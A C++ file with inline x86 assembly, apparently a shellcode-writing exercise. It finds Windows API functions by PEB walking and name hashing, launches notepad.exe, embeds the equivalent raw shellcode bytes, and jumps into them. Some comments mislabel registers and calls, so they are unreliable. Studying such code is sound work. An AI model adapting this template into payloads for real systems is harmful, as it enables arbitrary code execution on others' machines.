//  cl ..\src\do32CommandOpcode.cpp
#include "stdio.h"
#include "stdlib.h"
#include "windows.h"

#define EIGHT_NOPS __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\
                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90
#define PROC_BEGIN  EIGHT_NOPS
#define PROC_END    EIGHT_NOPS
void doCommandLineAsm()
{
//==============================================================================
    __asm{
    PROC_BEGIN;     // Begin of the code
        push    00657865h   ;
        push    2e646170h   ;
        push    65746f6eh   ; "notepad.exe"
        mov     edi, esp    ; edi="notepad.exe"
        push    0xff0d6657  ; //hash("CloseHandle")=0xff0d6657
        push    0x4fd18963  ; //hash("ExitProcess")=0x4fd18963
        push    0x6ba6bcc9  ; //hash(CreateProcessA)=0x6ba6bcc9

        pop     edx;        ; //edx=GetHash("CreateProcessA");
        call    findHashFuncAddrProc;   // eax=address of function
        mov     esi,eax;    ;// esi=CreateProcessA
        pop     edx;        ;// edx=GetHash("ExitProcess");
        call    findHashFuncAddrProc;   // eax=address of function
        mov     ebx,eax;    ;// ebx=CloseHandle

        call    doCommandProc;          // eax

        jmp     end_of_this_function;    // finish all job. 
   
  doCommandProc:
        push    ecx;
        push    edx;
        push    esi;
        push    edi;
        push    ebp;
        mov     ebp,esp;

        mov     edx,edi;    //edx=szCmdLine
        sub     esp, 54h;
        mov     edi, esp;
        push    14h;
        pop     ecx;
        xor     eax,eax;
        stack_zero:
        mov     [edi+ecx*4], eax;
        loop    stack_zero;

        mov     byte ptr [edi+10h], 44h         ; si.cb = sizeof(si)
        lea     eax, [edi+10h]
        push    edi;    //push    piPtr;
        push    eax;    //push    siPtr;
        push    NULL;
        push    NULL;
        push    0;
        push    FALSE;
        push    NULL;
        push    NULL;
        push    edx;    //edx=szCmdLine
        push    NULL;
        call    esi;    //eax=return value;ptrCreateProcessA;
        cmp     eax,0;
        je     donot_closehandle;
        push    eax;
        call    ebx;    //ExitProcess;

      donot_closehandle:
        mov     esp,ebp;
        pop     ebp;
        pop     edi;
        pop     esi;
        pop     edx;
        pop     ecx;
        retn;

    findHashFuncAddrProc:
        push    esi;
        push    ebx;
        push    ecx;
        push    edx;
        call    get_base_address;
        cmp     eax,0   ;   // the base address is 0, done.
        jle     end_of_findHashFuncAddrProc; if ecx <=0 done.
        mov     ebx,eax ;   // save the base to ebx;
        call    get_function_addr;
    end_of_findHashFuncAddrProc:
        pop     edx;
        pop     ecx;
        pop     ebx;
        pop     esi;
        retn;

    get_base_address:
        mov     eax, fs:30h     ; PEB base
        mov     eax, [eax+0ch]  ; PEB_LER_DATA
        mov     eax,[eax+1ch]  ; The first element of InInitOrderModuleList
        mov     eax,[eax]       ; Next element
        mov     eax,[eax+8]     ; eax = Base address of the module
        retn;

    get_function_addr:
        mov     eax,[ebx+3ch]       ; e_lfanew
        mov     eax,[eax+ebx+78h]   ; DataDirectory[0]
        add     eax,ebx             ; RVA + base
        mov     esi,eax             ; Save first DataDirectory to esi
        mov     ecx,[esi+18h]           ; NumberOfNames
    compare_names_hash:
        mov     eax, [esi+20h]          ; AddressOfNames RVA
        add     eax, ebx                ; rva2va
        mov     eax, [eax+ecx*4-4]      ; NamesAddress RVA
        add     eax, ebx                ; rva2va, now eax store the address of the name

        push    edi                     ; save edi to stack
        mov     edi,eax                 ; put the address of the string to edi
        call    hash_proc;              ; gethash
        pop     edi                     ; restor edi from stack
        
        cmp     eax,edx;                ; compare to hash;
        je      done_find_hash;
    loop compare_names_hash;
        xor     eax,eax;
        jmp     done_get_function_addr;
    done_find_hash:
        mov     eax, [esi+1ch]          ; AddressOfFunctions RVA
        add     eax, ebx                ; rva2va
        mov     eax, [eax+ecx*4-4]      ; FunctionAddress RVA
        add     eax, ebx                ; rva2va, now eax store the address of the Function
    done_get_function_addr:
        retn;

    hash_proc:
        // save ebx,ecx,edx,edi
        push    ebx         ;
        push    ecx         ;
        push    edx         ;
        push    edi         ;
        xor     edx,edx     ; edx = h
    hash_loop:              ;
        movsx   eax,byte ptr [edi]  ; [eax]=*c ==> eax
        cmp     eax,0       ;
      je  exit_hash_proc    ;
        mov     ebx,edx     ;  h ==> ebx
        mov     ecx,edx     ;  h ==> ecx
        shl     ebx,19h     ; h << 25
        shr     ecx,7       ; ( h >> 7 )
        or      ebx,ecx     ; ( ( h << 25 ) | ( h >> 7 ) )
        mov     edx,ebx     ;
        add     edx,eax     ;
        inc     edi;        ;
    jmp hash_loop           ;
    exit_hash_proc:         ;
        mov     eax,edx     ; save hash to eax
        // restore ebx,ecx,edx,edi
        pop     edi         ;
        pop     edx         ;
        pop     ecx         ;
        pop     ebx         ;
        retn                ;
end_of_this_function:
    PROC_END;   // End of the code
    };
}

char shellcodeRAW[]=
/* 264=0x108 bytes */
"\x68\x65\x78\x65\x00\x68\x70\x61\x64\x2e\x68\x6e\x6f\x74\x65\x8b"
"\xfc\x68\x57\x66\x0d\xff\x68\x63\x89\xd1\x4f\x68\xc9\xbc\xa6\x6b"
"\x5a\xe8\x56\x00\x00\x00\x8b\xf0\x5a\xe8\x4e\x00\x00\x00\x8b\xd8"
"\xe8\x05\x00\x00\x00\xe9\xce\x00\x00\x00\x51\x52\x56\x57\x55\x8b"
"\xec\x8b\xd7\x83\xec\x54\x8b\xfc\x6a\x14\x59\x33\xc0\x89\x04\x8f"
"\xe2\xfb\xc6\x47\x10\x44\x8d\x47\x10\x57\x50\x6a\x00\x6a\x00\x6a"
"\x00\x6a\x00\x6a\x00\x6a\x00\x52\x6a\x00\xff\xd6\x83\xf8\x00\x74"
"\x03\x50\xff\xd3\x8b\xe5\x5d\x5f\x5e\x5a\x59\xc3\x56\x53\x51\x52"
"\xe8\x11\x00\x00\x00\x83\xf8\x00\x7e\x07\x8b\xd8\xe8\x17\x00\x00"
"\x00\x5a\x59\x5b\x5e\xc3\x64\xa1\x30\x00\x00\x00\x8b\x40\x0c\x8b"
"\x40\x1c\x8b\x00\x8b\x40\x08\xc3\x8b\x43\x3c\x8b\x44\x18\x78\x03"
"\xc3\x8b\xf0\x8b\x4e\x18\x8b\x46\x20\x03\xc3\x8b\x44\x88\xfc\x03"
"\xc3\x57\x8b\xf8\xe8\x17\x00\x00\x00\x5f\x3b\xc2\x74\x06\xe2\xe6"
"\x33\xc0\xeb\x0b\x8b\x46\x1c\x03\xc3\x8b\x44\x88\xfc\x03\xc3\xc3"
"\x53\x51\x52\x57\x33\xd2\x0f\xbe\x07\x83\xf8\x00\x74\x13\x8b\xda"
"\x8b\xca\xc1\xe3\x19\xc1\xe9\x07\x0b\xd9\x8b\xd3\x03\xd0\x47\xeb"
"\xe5\x8b\xc2\x5f\x5a\x59\x5b\xc3";

void doShellcode(void * code)
{
    __asm
    {
    begin_proc:
      call    vul_function;
        jmp     code;
        jmp     end_proc;
      vul_function:
        ret;
    end_proc:;
    }
}

void main(int argc, char * argv[])
{
  //doCommandLineAsm();
  //  doShellcode(doCommandLineAsm);
  doShellcode(shellcodeRAW);
}